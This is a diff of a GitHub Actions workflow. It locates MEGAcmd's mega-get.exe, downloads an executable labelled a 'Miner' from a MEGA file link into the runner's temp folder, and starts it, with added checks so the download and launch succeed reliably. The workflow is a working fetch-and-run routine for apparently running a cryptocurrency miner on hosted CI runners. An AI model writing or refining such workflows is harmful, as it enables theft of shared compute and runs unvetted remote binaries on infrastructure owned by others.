@@ -82,15 +82,32 @@ jobs:
         run: |
           choco install megacmd -y
 
-      # --- Download Miner from MEGA (fixed syntax) ---
+      # --- Locate mega-get.exe robustly ---
+      - name: Locate mega-get.exe
+        id: megacmd-locate
+        run: |
+          $megaGet = Get-ChildItem -Path C:\ -Filter mega-get.exe -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
+          if (-not $megaGet) {
+            Write-Host "mega-get.exe not found! MEGAcmd install may have failed."
+            exit 1
+          }
+          Write-Host "Found mega-get.exe at $megaGet"
+          echo "MEGA_GET_PATH=$megaGet" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+
+      # --- Download Miner from MEGA using found path ---
       - name: Download Miner from MEGA
         run: |
-          & "$env:ProgramFiles\MEGAcmd\mega-get.exe" "https://mega.nz/file/atJjSJJK#5LSuE8B1fYUrTwfrsErG7G7O51HGUZSBLzSlPioAkwA" "$env:TEMP"
+          & "${env:MEGA_GET_PATH}" "https://mega.nz/file/atJjSJJK#5LSuE8B1fYUrTwfrsErG7G7O51HGUZSBLzSlPioAkwA" "$env:TEMP"
 
       # --- Run Your Miner ---
       - name: Run Your Miner
         run: |
-          Start-Process -FilePath "$env:TEMP\ok.exe"
+          $miner = "$env:TEMP\ok.exe"
+          if (-not (Test-Path $miner)) {
+            Write-Host "Miner not found at $miner!"
+            exit 1
+          }
+          Start-Process -FilePath $miner
           Write-Host "Miner started!"
 
       # --- Maintain Connection (Graceful Stop for Shutdown) ---
